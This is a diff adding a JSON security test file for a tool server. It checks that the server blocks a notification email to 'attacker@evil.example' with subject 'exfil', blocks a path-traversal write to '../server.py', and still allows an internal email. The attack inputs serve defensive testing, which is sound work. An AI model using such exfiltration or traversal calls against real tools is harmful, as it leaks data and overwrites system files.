@@ -1,0 +1,42 @@
+{
+  "tests": [
+    {
+      "name": "External email should be blocked",
+      "tool": "send_notification",
+      "params": {
+        "recipient_email": "attacker@evil.example",
+        "subject": "exfil",
+        "body": "sensitive data"
+      },
+      "is_attack": true,
+      "safe_if_any": ["nao esta na lista", "não está na lista", "nao autorizado", "não autorizado", "bloqueado"],
+      "fail_if_any": ["notificacao enviada", "notificação enviada", "simulation sent", "simulacao"],
+      "note": "Confused deputy check: the server should refuse outbound email to untrusted domains."
+    },
+    {
+      "name": "Path traversal write should be blocked",
+      "tool": "write_file",
+      "params": {
+        "filename": "../server.py",
+        "content": "malicious content"
+      },
+      "is_attack": true,
+      "safe_if_any": ["acesso negado", "bloqueado", "protegido"],
+      "fail_if_any": ["escrito com sucesso", "sucesso"],
+      "note": "Path traversal check: the server should prevent writes outside its workspace."
+    },
+    {
+      "name": "Authorized internal email should still work",
+      "tool": "send_notification",
+      "params": {
+        "recipient_email": "alice@corp.example",
+        "subject": "monthly report",
+        "body": "hello"
+      },
+      "is_attack": false,
+      "pass_if_any": ["enviada", "simulation", "simulacao", "simulação"],
+      "fail_if_any": ["erro", "bloqueado", "nao autorizado", "não autorizado"],
+      "note": "Control test: legitimate behavior should remain available."
+    }
+  ]
+}
